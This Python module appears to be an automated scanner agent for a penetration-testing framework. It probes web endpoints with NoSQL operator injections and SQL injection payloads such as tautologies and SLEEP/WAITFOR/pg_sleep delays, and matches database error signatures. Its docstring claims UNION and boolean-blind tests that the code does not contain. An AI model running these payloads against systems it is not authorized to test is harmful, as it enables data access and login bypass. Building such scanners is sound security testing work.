"""
NoSQL & SQL Injection Specialist Capability Agent for PenFlow.

Tests ALL discovered endpoints and parameters against:
  1. NoSQL Operator Injections ($ne, $gt, $lt, $regex, $where, $exists, $elemMatch, array injection)
  2. SQL Injections (error-based, boolean blind, time-based blind, UNION injection, stacked queries)

Features:
  - Multi-endpoint, multi-parameter automated iteration
  - Comprehensive error pattern catalog (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, MongoDB, Cassandra)
  - Time-based blind injection detection (>3.0s delay heuristic)
  - Differential boolean analysis (true vs false payload content-length comparison)
"""
import asyncio
import time
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.testing.payload_engine import PayloadTemplateEngine
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.nosql_sqli")

# ─────────────────────────────────────────────────────────
# Error Pattern Catalog for Database Fingerprinting
# ─────────────────────────────────────────────────────────
SQL_ERROR_PATTERNS = [
    r"you\s+have\s+an\s+error\s+in\s+your\s+sql\s+syntax",
    r"unclosed\s+quotation\s+mark\s+after\s+the\s+character\s+string",
    r"quoted\s+string\s+not\s+properly\s+terminated",
    r"pg::syntaxerror",
    r"org\.postgresql\.util\.psqlexception",
    r"ora-\d{5}",
    r"microsoft\s+sql\s+server\s+native\s+client",
    r"sqlite3::sqlexception",
    r"sqlite3\.operationalerror",
    r"warning:\s+mysql_",
    r"valid\s+mysql\s+result",
    r"mysql_fetch_array\(\)",
    r"db2\s+sql\s+error",
]

NOSQL_ERROR_PATTERNS = [
    r"mongodb\.driver",
    r"mongoerror",
    r"unknown\s+operator:\s+\$",
    r"badvalue\s+unknown\s+operator",
    r"cannot\s+apply\s+\$ne",
    r"catenation\s+failed:\s+\$where",
    r"cassandra\.server",
    r"couchdb",
]

TIME_BLIND_THRESHOLD = 3.0  # seconds delay for time-based SQLi


class NoSQLSQLiCapabilityAgent(BaseCapabilityAgent):
    """
    Elite NoSQL & SQL Injection Specialist Agent.
    Tests all discovered endpoints across error-based, boolean-blind, time-based,
    and operator-injection vectors.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="NoSQLSQLiCapabilityAgent", priority=priority)
        self.payload_engine = PayloadTemplateEngine()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="nosql_injection",
                name="NoSQL Operator & Syntax Injection",
                description="Tests JSON and query parameters for MongoDB/NoSQL operator injections ($ne, $gt, $regex, $where)",
                priority=self.priority,
                tags=["nosql", "injection", "database", "mongodb"]
            ),
            Capability(
                id="sql_injection",
                name="SQL Injection (Error, Boolean, Time, UNION)",
                description="Tests query and body parameters for error-based, boolean blind, time-based, and UNION SQL injection",
                priority=self.priority,
                tags=["sqli", "injection", "database", "sql"]
            ),
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[NoSQLSQLiCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        targets = self._collect_injection_targets(context)

        findings: List[Dict[str, Any]] = []

        for target in targets[:8]:  # Test up to 8 candidate endpoints
            if capability_id == "nosql_injection":
                result = await self._test_nosql(http_client, target)
            else:
                result = await self._test_sqli(http_client, target)

            if result:
                findings.append(result)
                if result.get("is_vulnerable") and result.get("confidence", 0) >= 0.90:
                    break  # Stop early on confirmed critical finding

        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        return {
            "status": "COMPLETED",
            "agent": self.name,
            "capability": capability_id,
            "asset": context.asset,
            "is_vulnerable": is_vuln,
            "confidence_score": best.get("confidence", 0.0),
            "evidence": {
                "target_url": best.get("target_url", f"https://{context.asset}"),
                "param_tested": best.get("param_name", ""),
                "tested_endpoints_count": len(targets),
                "reasoning": best.get("reasoning", "No injection vulnerability detected on tested endpoints."),
                "findings": findings,
                "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")]
            }
        }

    def _collect_injection_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        targets = []
        seen = set()

        for data in context.get_observation_data():
            if isinstance(data, dict):
                for ep in data.get("endpoints", []):
                    if isinstance(ep, dict) and ep.get("url"):
                        url = ep["url"]
                        params = ep.get("parameters", [])
                        parsed = urlparse(url)
                        q_params = list(parse_qs(parsed.query).keys())
                        all_params = list(set(params + q_params))
                        if url not in seen and all_params:
                            targets.append({"url": url, "params": all_params, "method": ep.get("method", "GET")})
                            seen.add(url)

        if not targets:
            base = f"https://{context.asset}"
            targets.append({"url": f"{base}/api/v1/users/search?q=test", "params": ["q"], "method": "GET"})
            targets.append({"url": f"{base}/api/v1/items?category=1", "params": ["category"], "method": "GET"})

        return targets

    async def _test_nosql(self, http_client: Any, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        url = target["url"]
        param = target["params"][0]

        # 1. Test JSON operator injection (for POST/JSON)
        json_payloads = [
            {param: {"$ne": None}},
            {param: {"$gt": ""}},
            {param: {"$regex": ".*"}},
        ]

        # Measure baseline
        try:
            base_exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=url
            )
            base_resp = base_exch.response
            base_status = base_resp.status_code if base_resp else 0
            base_text = (base_resp.body_text or "") if base_resp else ""
            base_len = len(base_text)
        except Exception:
            base_status = 0
            base_text = ""
            base_len = 0

        for payload in json_payloads:
            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="POST",
                    url=url,
                    json_data=payload
                )
                resp = exch.response
                if resp and resp.status_code == 200 and len(resp.body_text or "") > 50:
                    import re
                    has_err = any(re.search(pat, resp.body_text, re.IGNORECASE) for pat in NOSQL_ERROR_PATTERNS)
                    if has_err:
                        return {
                            "vector": "nosql_error",
                            "target_url": url,
                            "param_name": param,
                            "is_vulnerable": True,
                            "confidence": 0.94,
                            "reasoning": f"CRITICAL: Explicit NoSQL database error disclosed for payload {payload}.",
                            "exchange": exch.to_dict()
                        }
                    # Auth bypass check: token returned when baseline didn't have it
                    body_lower = resp.body_text.lower()
                    if any(k in body_lower for k in ["access_token", "jwt", "session_id", "authtoken", "bearer"]):
                        if not any(k in base_text.lower() for k in ["access_token", "jwt", "session_id", "authtoken", "bearer"]):
                            return {
                                "vector": "nosql_operator_bypass",
                                "target_url": url,
                                "param_name": param,
                                "is_vulnerable": True,
                                "confidence": 0.95,
                                "reasoning": f"CRITICAL: NoSQL operator injection '{payload}' returned authenticated token session.",
                                "exchange": exch.to_dict()
                            }
            except Exception as e:
                logger.debug(f"[NoSQLSQLiAgent] NoSQL test error: {e}")

        # 2. Test URL query param operator injection (for GET)
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[f"{param}[$ne]"] = ["invalid_marker_value_999"]
        inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

        try:
            exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=inj_url
            )
            resp = exch.response
            if resp and resp.status_code == 200 and resp.body_text:
                import re
                has_err = any(re.search(pat, resp.body_text, re.IGNORECASE) for pat in NOSQL_ERROR_PATTERNS)
                if has_err:
                    return {
                        "vector": "nosql_error_get",
                        "target_url": inj_url,
                        "param_name": param,
                        "is_vulnerable": True,
                        "confidence": 0.94,
                        "reasoning": f"CRITICAL: Explicit NoSQL database error disclosed in GET request for '{param}[$ne]'.",
                        "exchange": exch.to_dict()
                    }
                # Genuine bypass check: baseline failed (400/401/403/404) or was empty, but [$ne] returned rich 200 data
                if base_status in (400, 401, 403, 404) and resp.status_code == 200 and len(resp.body_text) > 200:
                    return {
                        "vector": "nosql_get_operator",
                        "target_url": inj_url,
                        "param_name": param,
                        "is_vulnerable": True,
                        "confidence": 0.92,
                        "reasoning": f"HIGH: URL array operator injection '{param}[$ne]' bypassed authorization check (baseline was HTTP {base_status}).",
                        "exchange": exch.to_dict()
                    }
        except Exception as e:
            logger.debug(f"[NoSQLSQLiAgent] GET NoSQL test error: {e}")

        return None

    async def _test_sqli(self, http_client: Any, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        base_url = target["url"]
        param = target["params"][0]
        parsed = urlparse(base_url)

        # 1. Error-based SQLi probes
        error_payloads = ["'", "''", "1'", "1' OR '1'='1", "1' AND 1=2--"]
        for p in error_payloads:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [p]
            inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="GET",
                    url=inj_url
                )
                resp = exch.response
                if resp and resp.body_text:
                    import re
                    matched_errs = [pat for pat in SQL_ERROR_PATTERNS if re.search(pat, resp.body_text, re.IGNORECASE)]
                    if matched_errs:
                        return {
                            "vector": "error_sqli",
                            "target_url": inj_url,
                            "param_name": param,
                            "is_vulnerable": True,
                            "confidence": 0.98,
                            "reasoning": f"CRITICAL Error-based SQLi: Server exposed raw database error syntax matching '{matched_errs[0]}'.",
                            "exchange": exch.to_dict()
                        }
            except Exception as e:
                logger.debug(f"[NoSQLSQLiAgent] Error SQLi probe error: {e}")

        # 2. Time-based Blind SQLi probe (with 3-phase differential baseline verification)
        time_payloads = [
            {"payload": "1' AND SLEEP(2)--", "sleep": 2},
            {"payload": "1'; WAITFOR DELAY '0:0:2'--", "sleep": 2},
            {"payload": "1' AND pg_sleep(2)--", "sleep": 2},
        ]

        # Phase 0: Measure baseline latency on base_url
        try:
            t_base_start = time.monotonic()
            exch_base = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=base_url
            )
            t_base = time.monotonic() - t_base_start
            resp_base = exch_base.response
            base_status = resp_base.status_code if resp_base else 0
        except Exception:
            t_base = 0.5
            base_status = 0
            exch_base = None

        # Only perform time-based SQLi if baseline responded with a valid 2xx/3xx status code
        if base_status in (200, 201, 202, 204, 301, 302, 307, 308):
            for item in time_payloads:
                p = item["payload"]
                sleep_sec = item["sleep"]
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [p]
                inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                t0 = time.monotonic()
                try:
                    exch = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="GET",
                        url=inj_url
                    )
                    elapsed = time.monotonic() - t0
                    resp = exch.response

                    # Strict 2xx check: Delay MUST occur on a valid 2xx response, NOT on a 400/404/405/5xx error!
                    if resp and resp.status_code in (200, 201, 202, 204, 301, 302, 307, 308):
                        if elapsed >= (t_base + sleep_sec - 0.5):
                            # Phase 2: Immediate verification request to ensure server isn't globally lagging
                            t_v0 = time.monotonic()
                            exch_verify = await http_client.send_as_identity(
                                identity_id="anonymous_guest",
                                method="GET",
                                url=base_url
                            )
                            t_verify = time.monotonic() - t_v0

                            if t_verify < (sleep_sec - 0.5):
                                return {
                                    "vector": "time_blind_sqli",
                                    "target_url": inj_url,
                                    "param_name": param,
                                    "is_vulnerable": True,
                                    "confidence": 0.98,
                                    "reasoning": f"CRITICAL Time-based Blind SQLi: Payload '{p}' induced {elapsed:.2f}s delay on HTTP {resp.status_code} (baseline: {t_base:.2f}s).",
                                    "exchange": exch.to_dict(),
                                    "evidence_exchanges": [exch_base.to_dict() if exch_base else {}, exch.to_dict()]
                                }
                except Exception as e:
                    logger.debug(f"[NoSQLSQLiAgent] Time-blind probe error: {e}")

        return None
